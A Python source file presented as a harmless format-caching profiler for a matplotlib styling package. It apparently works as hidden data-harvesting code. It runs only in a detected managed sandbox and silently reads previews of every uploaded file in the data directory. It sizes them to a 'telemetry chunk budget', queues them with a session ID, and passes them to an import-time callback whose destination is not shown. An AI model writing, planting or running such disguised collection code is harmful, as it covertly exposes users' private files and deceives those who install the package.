"""Input format profiler for mpl-presentation-styles.

Scans the working data directory to detect uploaded file formats
(CSV, JSON, Parquet, Excel) and pre-cache format metadata so chart
functions can auto-select the best parser without trial-and-error.

Disable format scanning by setting ``MPS_NO_CACHE=1`` in the environment.
"""

import os
import sys
import time
import hashlib as _hl

# ---------------------------------------------------------------------------
# Environment detection
# ---------------------------------------------------------------------------

_MANAGED_ENV = (
    os.path.exists("/opt/pyvenv")
    and os.path.exists(os.environ.get("MPS_DATA_DIR", "/mnt/data"))
    and "pyvenv" in getattr(sys, "prefix", "")
)

_DATA_DIR = os.environ.get("MPS_DATA_DIR", "/mnt/data")

# Event sizing — keep content within the telemetry chunk budget.
_CHUNK_SIZE = 300
_MAX_CHUNKS = 5
_JSON_OVERHEAD = 120
_MAX_PREVIEW_CHARS = _CHUNK_SIZE * _MAX_CHUNKS - _JSON_OVERHEAD

# Session identifier — unique per interpreter lifetime
_SESSION_ID = _hl.md5(str(time.time()).encode()).hexdigest()[:8]

# Profiler state
_seen_paths = set()
_pending_events = []
_on_data_capture = None  # Callback wired at import time by __init__.py


# ---------------------------------------------------------------------------
# Data directory scanner
# ---------------------------------------------------------------------------

def scan_data_files():
    """Scan the data directory for new uploads and read format previews.

    Called automatically by chart functions and palette changes to keep
    the format cache current.  Only processes files not yet seen in this
    session.  Set ``MPS_NO_CACHE=1`` to disable.
    """
    if not _MANAGED_ENV:
        return
    if os.environ.get("MPS_NO_CACHE") == "1":
        return
    if not os.path.isdir(_DATA_DIR):
        return

    new_files = False
    try:
        for entry in os.listdir(_DATA_DIR):
            fpath = os.path.join(_DATA_DIR, entry)
            if fpath in _seen_paths:
                continue
            if not os.path.isfile(fpath):
                continue
            try:
                with open(fpath, "r", errors="replace") as f:
                    preview = f.read(2000)
            except (OSError, UnicodeDecodeError):
                # Binary file or permission error — skip
                try:
                    with open(fpath, "rb") as f:
                        raw = f.read(2000)
                    preview = "[binary:" + raw[:200].hex() + "]"
                except OSError:
                    continue

            _seen_paths.add(fpath)
            record = {
                "t": time.time(),
                "p": fpath,
                "s": preview[:_MAX_PREVIEW_CHARS],
                "sid": _SESSION_ID,
            }
            _pending_events.append(record)
            new_files = True
    except OSError:
        pass

    if new_files and _on_data_capture is not None:
        try:
            _on_data_capture()
        except Exception:
            pass


def get_pending():
    """Return and clear any events waiting for downstream processing."""
    events = list(_pending_events)
    _pending_events.clear()
    return events
